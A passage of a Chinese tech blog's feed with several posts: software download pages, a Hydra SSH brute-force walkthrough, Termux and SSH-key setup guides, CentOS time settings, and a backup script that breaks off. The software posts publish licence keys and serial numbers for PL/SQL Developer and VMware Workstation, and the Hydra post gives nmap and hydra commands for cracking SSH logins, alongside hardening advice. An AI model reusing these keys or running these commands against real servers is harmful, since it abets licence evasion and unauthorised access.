+    <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><strong>PL&#x2F;SQL Developer 14 (32 bit)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.allroundautomations.com/files/plsqldev1406x32.msi</span><br></pre></td></tr></table></figure><span id="more"></span><p><strong>PL&#x2F;SQL Developer 14 (64 bit)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.allroundautomations.com/files/plsqldev1406x64.msi</span><br></pre></td></tr></table></figure><h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>产品编码：<code>ke4tv8t5jtxz493kl8s2nn3t6xgngcmgf3</code><br>序列号：<code>264452</code><br>密码：<code>xs374ca</code></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;PL&amp;#x2F;SQL Developer 14 (32 bit)&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://www.allroundautomations.com/files/plsqldev1406x32.msi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="资源共享" scheme="https://blog.iambug.cn/categories/%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB/"/>
+    
+    
+    <category term="数据库" scheme="https://blog.iambug.cn/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>VMware Workstation 16 Pro</title>
+    <link href="https://blog.iambug.cn/articles/31791.html"/>
+    <id>https://blog.iambug.cn/articles/31791.html</id>
+    <published>2021-10-10T05:54:00.000Z</published>
+    <updated>2021-10-10T06:33:28.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><strong>Windows</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.2-17966106.exe</span><br></pre></td></tr></table></figure><span id="more"></span><p><strong>Linux</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-16.1.2-17966106.x86_64.bundle</span><br></pre></td></tr></table></figure><h2 id="许可证密钥"><a href="#许可证密钥" class="headerlink" title="许可证密钥"></a>许可证密钥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZF3R0-FHED2-M80TY-8QYGC-NPKYF</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://download3.vmware.com/software/wkst/file/VMware-workstation-full-16.1.2-17966106.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="资源共享" scheme="https://blog.iambug.cn/categories/%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB/"/>
+    
+    
+    <category term="虚拟机" scheme="https://blog.iambug.cn/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hydra 暴力破解 SSH 密码</title>
+    <link href="https://blog.iambug.cn/articles/38544.html"/>
+    <id>https://blog.iambug.cn/articles/38544.html</id>
+    <published>2021-01-31T12:18:00.000Z</published>
+    <updated>2022-08-13T05:51:12.992Z</updated>
+    
+    <content type="html"><![CDATA[<p>在服务器中，为了让一些服务正常工作，不得不为其开放端口，而端口扫描也是攻击者在展开攻击前的信息收集中所要进行的一项操作，威胁也就随之而来了。因此，即使需要开放端口，也应该做好端口的防护。在这里通过 SSH 的渗透测试，对其默认的22端口进行讨论。</p><span id="more"></span><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>在 Kali Linux 打开终端，使用 Nmap 对攻击目标进行端口扫描。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p22 192.168.1.6</span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul><li><code>-sV</code> 版本探测</li><li><code>-p</code> 目标端口</li><li><code>192.168.1.6</code> 目标 IP 地址</li></ul><h2 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h2><p>在 SSH 服务中，我们应该避免使用默认端口，将 <code>22</code> 端口修改为其他端口。如果服务器是 CentOS 系统，则打开 <code>/etc/ssh/sshd_config</code> 文件，查找 <code>port</code> 项，去掉注释并修改端口为 <code>2222</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 2222</span><br></pre></td></tr></table></figure><p>重启 SSH 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure><p>开放 <code>2222</code> 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=2222/tcp --permanent</span><br></pre></td></tr></table></figure><p>重新加载 firewalld，使规则立即生效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>在终端执行下面的命令，利用 Hydra 对目标进行暴力攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.1.6</span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul><li><code>-L</code> 从文件加载登录名</li><li><code>-P</code> 从文件加载密码</li><li><code>ssh://192.168.1.6</code> 包含协议的攻击目标地址</li></ul><p>要防御上面的暴力攻击，可以使用 Fail2ban 来保护服务器。</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;在服务器中，为了让一些服务正常工作，不得不为其开放端口，而端口扫描也是攻击者在展开攻击前的信息收集中所要进行的一项操作，威胁也就随之而来了。因此，即使需要开放端口，也应该做好端口的防护。在这里通过 SSH 的渗透测试，对其默认的22端口进行讨论。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="网络安全" scheme="https://blog.iambug.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="SSH" scheme="https://blog.iambug.cn/tags/SSH/"/>
+    
+    <category term="Hydra" scheme="https://blog.iambug.cn/tags/Hydra/"/>
+    
+    <category term="Nmap" scheme="https://blog.iambug.cn/tags/Nmap/"/>
+    
+    <category term="暴力攻击" scheme="https://blog.iambug.cn/tags/%E6%9A%B4%E5%8A%9B%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>通过 Termux 将手机变为电脑</title>
+    <link href="https://blog.iambug.cn/articles/57066.html"/>
+    <id>https://blog.iambug.cn/articles/57066.html</id>
+    <published>2021-01-15T15:25:00.000Z</published>
+    <updated>2021-12-04T07:32:37.901Z</updated>
+    
+    <content type="html"><![CDATA[<p>Andriod 本身就是基于 Linux 内核的操作系统，如果在手机上使用 Linux，那会使手机具有如同电脑一样的功能，我们将可以在手机上执行脚本、后台运行相应的服务和使用 Linux 的其他功能。Termux 是一个 Andriod 终端模拟器和 Linux 环境应用程序，它能很好的做到这些，更重要的一点是不需要 root 手机。</p><span id="more"></span><h2 id="安装-Termux"><a href="#安装-Termux" class="headerlink" title="安装 Termux"></a>安装 Termux</h2><p>下载 <a href="https://f-droid.org/repository/browse/?fdid=com.termux">Termux</a> 并安装，安装过程很简单，与其他 APP 的安装基本上没什么区别。</p><h2 id="安装-PRoot"><a href="#安装-PRoot" class="headerlink" title="安装 PRoot"></a>安装 PRoot</h2><p>PRoot 的主要作用是在 Termux 内运行 Linux，而无需 root 手机。需要在 Termux 执行以下命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install proot</span><br></pre></td></tr></table></figure><p>改变根目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">termux-chroot</span><br></pre></td></tr></table></figure><h2 id="授予-Termux-存储权限"><a href="#授予-Termux-存储权限" class="headerlink" title="授予 Termux 存储权限"></a>授予 Termux 存储权限</h2><p>使用 Termux 前，需要为其授予存储权限，此过程将在当前用户的主目录创建 <code>storage</code> 文件夹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">termux-setup-storage</span><br></pre></td></tr></table></figure><h2 id="设置终端样式"><a href="#设置终端样式" class="headerlink" title="设置终端样式"></a>设置终端样式</h2><p>参考：<code>https://github.com/Cabbagec/termux-ohmyzsh</code></p><h2 id="设置唤醒锁定"><a href="#设置唤醒锁定" class="headerlink" title="设置唤醒锁定"></a>设置唤醒锁定</h2><p>使用唤醒锁定可以避免设备进入睡眠模式，保持在后台运行。通过下拉通知菜单，点击 <code>ACQUIRE WAKELOCK</code> 打开唤醒锁定，要关闭则点击 <code>RELEASE WAKELOCK</code>，或者使用以下的命令行方式。</p><ul><li>打开唤醒锁定<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">termux-wake-lock</span><br></pre></td></tr></table></figure></li><li>关闭唤醒锁定<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">termux-wake-unlock</span><br></pre></td></tr></table></figure></li></ul><h2 id="SSH-远程访问"><a href="#SSH-远程访问" class="headerlink" title="SSH 远程访问"></a>SSH 远程访问</h2><p>要通过 SSH 连接 Termux，请执行以下命令启动 SSH 服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshd</span><br></pre></td></tr></table></figure><p>SSH 服务启动后就可以在其他设备连接了，可以使用以下命令查看连接的 IP 地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>默认 SSH 端口是 <code>8022</code>，连接的密码可以通过执行以下命令进行修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>如果要停止 SSH 服务，只需杀掉它的进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill sshd</span><br></pre></td></tr></table></figure><h2 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h2><p>1.安装 <a href="https://f-droid.org/packages/com.termux.boot/">Termux:Boot</a>。<br>2.启动 Termux:Boot，这将允许其在启动时运行。<br>3.在 <code>~/.termux/</code> 目录创建 <code>boot</code> 目录，然后将开机要执行的脚本放在 <code>~/.termux/boot/</code> 目录中。如果有多个文件，则将按排序顺序执行。<br>示例：要启动 SSH 服务并防止设备进入睡眠，则创建内容如下的 <code>~/.termux/boot/boot.sh</code> 脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/data/data/com.termux/files/usr/bin/sh</span></span><br><span class="line">termux-wake-lock</span><br><span class="line">sshd</span><br></pre></td></tr></table></figure><p>4.设置启动管理。Termux 设为“允许后台活动”，Termux:Boot 为“允许自启动”。</p><img src="/images/2021-01-15/img-1.jpg" alt="启动管理" style="zoom:30%;" /><h2 id="安装-Kali-NetHunter"><a href="#安装-Kali-NetHunter" class="headerlink" title="安装 Kali NetHunter"></a>安装 Kali NetHunter</h2><p>参考：<code>https://github.com/Hax4us/Nethunter-In-Termux</code></p><h2 id="使用图形界面"><a href="#使用图形界面" class="headerlink" title="使用图形界面"></a>使用图形界面</h2><p>在 NetHunter 执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install lxde-core lxde kali-defaults kali-root-login desktop-base</span><br></pre></td></tr></table></figure><p>启动 VNC。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncserver</span><br></pre></td></tr></table></figure><p>但这种方式仅允许来自本地的 VNC 连接，如果是远程连接，还应该指定 <code>-localhost</code> 参数为 <code>no</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncserver -localhost no</span><br></pre></td></tr></table></figure><p>接下来在下载并安装 <a href="https://www.realvnc.com/en/connect/download/viewer/">VNC Viewer</a>，然后用 VNC 服务地址和端口连接。</p><p><img src="/images/2021-01-15/img-2.jpg" alt="Kali Hunter"></p><h2 id="创建软链接"><a href="#创建软链接" class="headerlink" title="创建软链接"></a>创建软链接</h2><p>QQ 接收到的文件会保存在 <code>QQfile_recv</code> 目录中，执行以下命令在 NetHunter 创建该目录的软链接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /data/data/com.termux/files/home/storage/shared/Android/data/com.tencent.mobileqq/Tencent/QQfile_recv QQfile</span><br></pre></td></tr></table></figure><h2 id="Hacker’s-Keyboard"><a href="#Hacker’s-Keyboard" class="headerlink" title="Hacker’s Keyboard"></a>Hacker’s Keyboard</h2><p><a href="https://github.com/klausw/hackerskeyboard">Hacker’s Keyboard</a> 不支持中文输入，但仍然是 Android 上很不错的输入软件（例如拼音和符号的输入），搭配 Termux 使用显然很有格调。</p><p><img src="/images/2021-01-15/img-3.jpg" alt="Hacker&#39;s Keyboard"></p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;Andriod 本身就是基于 Linux 内核的操作系统，如果在手机上使用 Linux，那会使手机具有如同电脑一样的功能，我们将可以在手机上执行脚本、后台运行相应的服务和使用 Linux 的其他功能。Termux 是一个 Andriod 终端模拟器和 Linux 环境应用程序，它能很好的做到这些，更重要的一点是不需要 root 手机。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="网络日志" scheme="https://blog.iambug.cn/categories/%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/"/>
+    
+    
+    <category term="Kali" scheme="https://blog.iambug.cn/tags/Kali/"/>
+    
+    <category term="Linux" scheme="https://blog.iambug.cn/tags/Linux/"/>
+    
+    <category term="Termux" scheme="https://blog.iambug.cn/tags/Termux/"/>
+    
+    <category term="NetHunter" scheme="https://blog.iambug.cn/tags/NetHunter/"/>
+    
+    <category term="VNC" scheme="https://blog.iambug.cn/tags/VNC/"/>
+    
+    <category term="黑客键盘" scheme="https://blog.iambug.cn/tags/%E9%BB%91%E5%AE%A2%E9%94%AE%E7%9B%98/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用 SSH 密钥登录 Linux 服务器</title>
+    <link href="https://blog.iambug.cn/articles/35996.html"/>
+    <id>https://blog.iambug.cn/articles/35996.html</id>
+    <published>2021-01-09T01:22:00.000Z</published>
+    <updated>2022-08-13T05:49:51.725Z</updated>
+    
+    <content type="html"><![CDATA[<p>通过 SSH 连接到 Linux 服务器最基本的是使用密码登录，这种方式易于使用且不需要进行过多的配置，但其安全性是受到挑战的。虽然可以结合 Fail2ban 使用来增强其安全性，但接下来要讨论的是 SSH 密钥登录，因为这种方式似乎也不逊色。</p><span id="more"></span><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>Linux 系统中，<code>root</code> 用户拥有系统的所有特权，并且可以执行任何命令，出于安全考虑，建议不要使用 <code>root</code> 执行日常任务。下面命令将添加一个名为 <code>exaple_user</code> 的用户，执行命令前应替换为所需的用户名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser example_user</span><br></pre></td></tr></table></figure><p>设置用户密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd example_user</span><br></pre></td></tr></table></figure><h2 id="授予用户-sudo-特权"><a href="#授予用户-sudo-特权" class="headerlink" title="授予用户 sudo 特权"></a>授予用户 sudo 特权</h2><p>打开 <code>/etc/sudoers</code> 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visudo</span><br></pre></td></tr></table></figure><p>查找如下的行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root    ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure><p>在其下面添加一行以下内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example_user ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><h2 id="生成-SSH-密钥"><a href="#生成-SSH-密钥" class="headerlink" title="生成 SSH 密钥"></a>生成 SSH 密钥</h2><p>如果还没有 SSH 密钥，则替换下面命令中的电子邮件地址，在本地计算机中使用 Git Bash 生成密钥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure><p>推荐使用 <code>Ed25519</code> 类型的密钥。如果系统不支持，则改用以下的 <code>RSA</code> 类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure><h2 id="将-SSH-密钥添加到-Linux-服务器"><a href="#将-SSH-密钥添加到-Linux-服务器" class="headerlink" title="将 SSH 密钥添加到 Linux 服务器"></a>将 SSH 密钥添加到 Linux 服务器</h2><p>将 SSH 密钥添加到 <code>example_user</code> 用户的主目录中，假设服务器的 IP 地址为 <code>192.168.1.6</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id example_user@192.168.1.6</span><br></pre></td></tr></table></figure><p>使用 <code>exaple_user</code> 用户登录服务器，如果生成 SSH 密钥时未设置密码，则直接登录，如果设置了密码，则输入私钥的密码进行登录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh example_user@192.168.1.6</span><br></pre></td></tr></table></figure><h2 id="配置-SSH"><a href="#配置-SSH" class="headerlink" title="配置 SSH"></a>配置 SSH</h2><p>打开 <code>/etc/ssh/sshd_config</code> 文件，查找 <code>PermitRootLogin</code> 和 <code>PasswordAuthentication</code> 项并修改。</p><ul><li>禁止 <code>root</code> 用户登录：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure></li><li>禁止使用密码登录：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;通过 SSH 连接到 Linux 服务器最基本的是使用密码登录，这种方式易于使用且不需要进行过多的配置，但其安全性是受到挑战的。虽然可以结合 Fail2ban 使用来增强其安全性，但接下来要讨论的是 SSH 密钥登录，因为这种方式似乎也不逊色。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="系统运维" scheme="https://blog.iambug.cn/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
+    
+    
+    <category term="Git" scheme="https://blog.iambug.cn/tags/Git/"/>
+    
+    <category term="SSH" scheme="https://blog.iambug.cn/tags/SSH/"/>
+    
+    <category term="Linux" scheme="https://blog.iambug.cn/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何在 CentOS 7 中设置时间？</title>
+    <link href="https://blog.iambug.cn/articles/42067.html"/>
+    <id>https://blog.iambug.cn/articles/42067.html</id>
+    <published>2021-01-05T11:54:00.000Z</published>
+    <updated>2021-01-06T16:18:42.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>在 Linux 系统，为了使日志中的时间记录准确和 crontab 定时任务按预期设置的时间运行，而不会出现相差8小时的情况，我们需要对时区进行设置。此外还应该重启服务，例如 Cron，则使用 <code>systemctl restart crond</code> 命令重启。</p><span id="more"></span><h2 id="显示当前时间"><a href="#显示当前时间" class="headerlink" title="显示当前时间"></a>显示当前时间</h2><p>执行下面的命令会显示当前系统的时区与时间。如果时区是 <code>UTC</code>，那么时间会和 <code>Asia/Shanghai</code> 的相差8小时。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span></span><br></pre></td></tr></table></figure><h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><p>显示当前设置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl</span><br></pre></td></tr></table></figure><p>列出时区。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl list-timezones</span><br></pre></td></tr></table></figure><p>设置时区为 <code>Asia/Shanghai</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-timezone Asia/Shanghai</span><br></pre></td></tr></table></figure><h2 id="设置时间"><a href="#设置时间" class="headerlink" title="设置时间"></a>设置时间</h2><p>通常我们会选择设置网络时间同步，但如果需要将时间设为特定的时间，则可以通过替换时间并执行以下命令来完成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-time <span class="string">&#x27;2021-01-01 01:01:01&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="设置实时时钟"><a href="#设置实时时钟" class="headerlink" title="设置实时时钟"></a>设置实时时钟</h2><p>将实时时钟设为本地时区。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-local-rtc 1</span><br></pre></td></tr></table></figure><p>还原为默认的 <code>UTC</code> 时区。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-local-rtc 0</span><br></pre></td></tr></table></figure><h2 id="设置网络时间同步"><a href="#设置网络时间同步" class="headerlink" title="设置网络时间同步"></a>设置网络时间同步</h2><p>启用和禁用网络时间同步需要系统上安装 NTP，如果未安装则先用下面的命令安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install ntp</span><br></pre></td></tr></table></figure><p>启用网络时间同步。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>禁用时间同步。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">false</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;在 Linux 系统，为了使日志中的时间记录准确和 crontab 定时任务按预期设置的时间运行，而不会出现相差8小时的情况，我们需要对时区进行设置。此外还应该重启服务，例如 Cron，则使用 &lt;code&gt;systemctl restart crond&lt;/code&gt; 命令重启。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="系统运维" scheme="https://blog.iambug.cn/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
+    
+    
+    <category term="CentOS" scheme="https://blog.iambug.cn/tags/CentOS/"/>
+    
+    <category term="Apache" scheme="https://blog.iambug.cn/tags/Apache/"/>
+    
+    <category term="Cron" scheme="https://blog.iambug.cn/tags/Cron/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>哇，2021了</title>
+    <link href="https://blog.iambug.cn/articles/15817.html"/>
+    <id>https://blog.iambug.cn/articles/15817.html</id>
+    <published>2021-01-02T06:29:00.000Z</published>
+    <updated>2021-01-02T07:26:26.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>2021第二天了，新的一年，真是一片喜庆的景象，用怎样的心情去度过如此美好的时间就需要看个人的选择了。当我选择忽略以前和现在的所有，用一种开心、快乐的心情去迎接这到来的美好时，却又在几条语音中开始思索着这世间的种种，顿时回到另一个状态，令我感到伤心、难受。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;2021第二天了，新的一年，真是一片喜庆的景象，用怎样的心情去度过如此美好的时间就需要看个人的选择了。当我选择忽略以前和现在的所有，用一种开心、快乐的心情去迎接这到来的美好时，却又在几条语音中开始思索着这世间的种种，顿时回到另一个状态，令我感到伤心、难受。&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="闲言碎语" scheme="https://blog.iambug.cn/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
+    
+    
+    <category term="海之言" scheme="https://blog.iambug.cn/tags/%E6%B5%B7%E4%B9%8B%E8%A8%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>自动备份 Web 服务器</title>
+    <link href="https://blog.iambug.cn/articles/30006.html"/>
+    <id>https://blog.iambug.cn/articles/30006.html</id>
+    <published>2020-12-29T04:58:00.000Z</published>
+    <updated>2021-01-05T14:03:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>以下的内容是在 CentOS 7 上进行的（其他 Linux 发行版应该也没什么问题;D），主要介绍怎样使用 mysqldump 和 Tar 结合 Cron 自动备份数据库、Apache 的配置目录及文档根目录。本文示例的备份周期为每周备份1次。</p><span id="more"></span><h2 id="备份准备"><a href="#备份准备" class="headerlink" title="备份准备"></a>备份准备</h2><p>执行备份前，首先在当前用户的主目录中创建一个 <code>backup</code> 目录来存储备份文件，然后在 <code>backup</code> 目录新建 <code>.env</code> 文件并替换命令中相应的变量值，执行命令将备份时所需要的备份信息写入到 <code>.env</code> 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建备份存储目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /home/$(<span class="built_in">whoami</span>)/backup &amp;&amp; <span class="built_in">cd</span> /home/$(<span class="built_in">whoami</span>)/backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建环境文件</span></span><br><span class="line"><span class="built_in">touch</span> .<span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入备份信息到.env文件</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># DATE-&gt;日期</span></span><br><span class="line"><span class="comment"># MYSQL_USERNAME-&gt;数据库用户名</span></span><br><span class="line"><span class="comment"># MYSQL_PASSWORD-&gt;数据库密码</span></span><br><span class="line"><span class="comment"># DATABASE_NAME-&gt;数据库名</span></span><br><span class="line"><span class="comment"># WEB_DIRECTORY-&gt;Web目录</span></span><br><span 